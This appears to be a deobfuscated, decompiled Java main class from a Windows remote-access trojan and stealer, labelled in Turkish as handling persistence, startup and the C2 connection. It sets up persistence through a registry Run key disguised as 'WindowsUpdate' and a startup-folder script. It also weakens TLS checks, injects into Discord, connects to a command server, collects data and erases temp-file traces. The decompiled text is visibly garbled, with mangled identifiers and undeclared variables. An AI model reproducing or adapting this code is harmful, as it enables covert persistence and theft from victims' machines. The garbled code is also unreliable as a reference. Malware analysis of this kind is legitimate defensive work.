/*\n * ========================================\n * DEOBFUSCATED: Main.java\n * Original: a/Main.java\n * ----------------------------------------\n * Ana giriÅŸ noktasÄ± - persistence, startup, C2 baÄŸlantÄ±sÄ±\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package a;

import a.a;
import a.e;
import a.g;
import c.Log;
import c.Net;
import c.b;
import d.c;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.RandomAccessFile;
import java.net.URI;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.StandardCopyOption;

public class Main {
    public static String C2_URL = "http://127.0.0.1:1338"  // Overridden by args[0];
    public static String LICENSE_KEY = ""  // Overridden by args[1];
    public static String HWID = "";
    public static String OPERATOR_ID = "";
    private static FileChannel lockChannel;
    private static FileLock instanceLock;
    private static RandomAccessFile lockFile;

    private static void ensureBundledJreRuntime() {
        try {
            String string = System.getProperty("java.home");
            if (string == null || string.isEmpty()) {
                return;
            }
            File file = new File(string, "lib");
            Main.patchJreAsset(file, "tzdb.dat");
            Main.patchJreAsset(file, "tzmappings");
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    private static void patchJreAsset(File file, String string) {
        try {
            File file2 = new File(file, string);
            if (file2.isFile() && file2.length() > 1000L && string.equals("tzdb.dat")) {
                return;
            }
            if (file2.isFile() && file2.length() > 100L && string.equals("tzmappings")) {
                return;
            }
            InputStream inputStream = Main.HWIDlass.getResourceAsStream("/jre/" + string);
            if (inputStream == null) {
                inputStream = ClassLoader.getSystemResourceAsStream("jre/" + string);
            }
            if (inputStream == null) {
                return;
            }
            file.mkdirs();
            try (InputStream inputStream2 = inputStream;
                 FileOutputStream fileOutputStream = new FileOutputStream(file2);){
                int n2;
                byte[] byArray = new byte[8192];
                while ((n2 = inputStream2.read(byArray)) > 0) {
                    fileOutputStream.write(byArray, 0, n2);
                }
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    private static String xd(String string) {
        byte[] byArray = new byte[string.length() / 2];
        for (int i2 = 0; i2 < byArray.length; ++i2) {
            byArray[i2] = (byte)(Integer.parseInt(string.substring(i2 * 2, i2 * 2 + 2), 16) ^ 0x5A);
        }
        return new String(byArray, StandardCharsets.UTF_8);
    }

    private static String runCmd(String[] stringArray) {
        try {
            Process process = Runtime.getRuntime().exec(stringArray);
            StringBuilder stringBuilder = new StringBuilder();
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));){
                String string;
                while ((string = bufferedReader.readLine()) != null) {
                    stringBuilder.append(string.toLowerCase()).append('\n');
                }
            }
            return stringBuilder.toString();
        }
        catch (Exception exception) {
            return "";
        }
    }

    private static boolean isVm() {
        return false;
    }

    private static boolean acquireSingleInstance() {
        try {
            File file;
            File file2;
            String string = System.getenv("LOCALAPPDATA");
            if (string == null || string.isEmpty()) {
                string = System.getProperty("java.io.tmpdir");
            }
            if (!(file2 = new File(string, "halos")).isDirectory()) {
                file2.mkdirs();
            }
            if ((f = (e = (g = new RandomAccessFile(file = new File(file2, "agent.lock"), "rw")).getChannel()).tryLock()) == null) {
                try {
                    e.close();
                }
                catch (Exception exception) {
                    // empty catch block
                }
                try {
                    g.close();
                }
                catch (Exception exception) {
                    // empty catch block
                }
                e = null;
                g = null;
                return false;
            }
            Runtime.getRuntime().addShutdownHook(new Thread(Main::lambda$acquireSingleInstance$0));
            return true;
        }
        catch (Exception exception) {
            return true;
        }
    }

    static void ensureHaloJarInstalled() {
        try {
            boolean bl;
            String string = System.getenv("LOCALAPPDATA");
            if (string == null || string.isEmpty()) {
                return;
            }
            File file = new File(string, "halo.jar");
            File file2 = Main.HWIDurrentJarFile();
            if (file2 == null || !file2.isFile()) {
                return;
            }
            if (file2.getCanonicalPath().equalsIgnoreCase(file.getCanonicalPath())) {
                return;
            }
            boolean bl2 = bl = !file.isFile() || file.length() != file2.length() || file.lastModified() < file2.lastModified();
            if (!bl) {
                return;
            }
            File file3 = file.getParentFile();
            if (file3 != null && !file3.isDirectory()) {
                file3.mkdirs();
            }
            File file4 = new File(string, "halo.jar.tmp");
            Files.copy(file2.toPath(), file4.toPath(), StandardCopyOption.REPLACE_EXISTING);
            try {
                Files.move(file4.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
            }
            catch (Exception exception) {
                Files.copy(file4.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
                try {
                    file4.delete();
                }
                catch (Exception exception2) {}
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static File currentJarFile() {
        Object object;
        try {
            object = Main.HWIDlass.getProtectionDomain().getCodeSource().getLocation().toURI();
            String[] stringArray = new File((URI)object);
            if (stringArray.isFile() && stringArray.getName().toLowerCase().endsWith(".jar")) {
                return stringArray;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            object = System.getProperty("java.class.path", "");
            for (String string : ((String)object).split(File.pathSeparator)) {
                File file;
                if (string == null || !(file = new File(string.trim())).isFile() || !file.getName().toLowerCase().endsWith(".jar")) continue;
                return file;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    private static String resolveJavaLauncher() {
        Object object;
        String string = System.getenv("LOCALAPPDATA");
        if (string != null && ((File)(object = new File(string, "halos\\jdk\\bin\\gangs.exe"))).isFile()) {
            return ((File)object).getAbsolutePath();
        }
        object = System.getProperty("java.home");
        if (object != null) {
            File file = new File((String)object, "bin\\javaw.exe");
            if (file.isFile()) {
                return file.getAbsolutePath();
            }
            File file2 = new File((String)object, "bin\\java.exe");
            if (file2.isFile()) {
                return file2.getAbsolutePath();
            }
        }
        return null;
    }

    static void addToStartup() {
        try {
            Object object;
            Main.ensureHaloJarInstalled();
            String string = System.getenv("LOCALAPPDATA");
            if (string == null || string.isEmpty()) {
                return;
            }
            String string2 = Main.resolveJavaLauncher();
            String string3 = new File(string, "halo.jar").getAbsolutePath();
            if (string2 == null || !new File(string2).isFile() || !new File(string3).isFile()) {
                return;
            }
            String string4 = "\"" + string2 + "\" --enable-native-access=ALL-UNNAMED -jar \"" + string3 + "\"";
            try {
                object = new ProcessBuilder("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", string4, "/f").redirectErrorStream(true).start();
                ((Process)object).waitFor();
            }
            catch (Exception exception) {
                // empty catch block
            }
            try {
                object = System.getenv("APPDATA");
                if (object != null) {
                    File file = new File((String)object, "Microsoft\\Windows\\Start Menu\\Programs\\Startup");
                    if (!file.isDirectory()) {
                        file.mkdirs();
                    }
                    if (file.isDirectory()) {
                        File file2 = new File(file, "WindowsUpdateHelper.cmd");
                        String string5 = "@echo off\r\nif not exist \"" + string3 + "\" exit /b 0\r\ntimeout /t 8 /nobreak >nul\r\nstart \"\" /B \"" + string2 + "\" --enable-native-access=ALL-UNNAMED -jar \"" + string3 + "\"\r\n";
                        Files.write(file2.toPath(), string5.getBytes(StandardCharsets.US_ASCII), new OpenOption[0]);
                    }
                }
            }
            catch (Exception exception) {}
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void main(String[] stringArray) {
        try {
            Main.mainRun(stringArray);
        }
        catch (Throwable throwable) {
            try {
                Log.agent("fatal startup: " + throwable.getClass().getSimpleName() + ": " + throwable.getMessage());
            }
            catch (Throwable throwable2) {
                // empty catch block
            }
            throw throwable;
        }
    }

    private static void mainRun(String[] stringArray) {
        Main.ensureBundledJreRuntime();
        Net.installTrustAll();
        if (!Main.acquireSingleInstance()) {
            return;
        }
        InitMarkerManager.deleteMarker();
        Main.ensureHaloJarInstalled();
        Main.addToStartup();
        if (stringArray != null && stringArray.length > 0 && stringArray[0] != null && !stringArray[0].isEmpty()) {
            a = stringArray[0];
        }
        if (stringArray != null && stringArray.length > 1 && stringArray[1] != null && !stringArray[1].isEmpty()) {
            b = stringArray[1];
        }
        String string = HwidGenerator.getHwid();
        try {
            DiscordInjector.injectAll();
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            RatController.connect(a, b, string);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        boolean bl = !InitMarkerManager.exists();
        try {
            DataCollector.collect(a, b, false);
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        if (bl) {
            try {
                InitMarkerManager.createMarker();
                Thread.sleep(2000L);
                InitMarkerManager.deleteMarker();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        Main.cleanupTempFiles();
        try {
            Main.addToStartup();
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        try {
            while (true) {
                Thread.sleep(60000L);
            }
        }
        catch (Exception exception) {
            return;
        }
    }

    private static void cleanupTempFiles() {
        try {
            File file = new File(System.getProperty("java.io.tmpdir"));
            if (!file.isDirectory()) {
                return;
            }
            File[] fileArray = file.listFiles();
            if (fileArray == null) {
                return;
            }
            for (File file2 : fileArray) {
                try {
                    if (!file2.isFile() || !file2.getName().matches(".*\\.(tmp|sqlite|db|log)$")) continue;
                    file2.delete();
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$acquireSingleInstance$0() {
        try {
            if (f != null) {
                f.release();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            if (e != null) {
                e.close();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            if (g != null) {
                g.close();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static {
        Main.ensureBundledJreRuntime();
    }
}

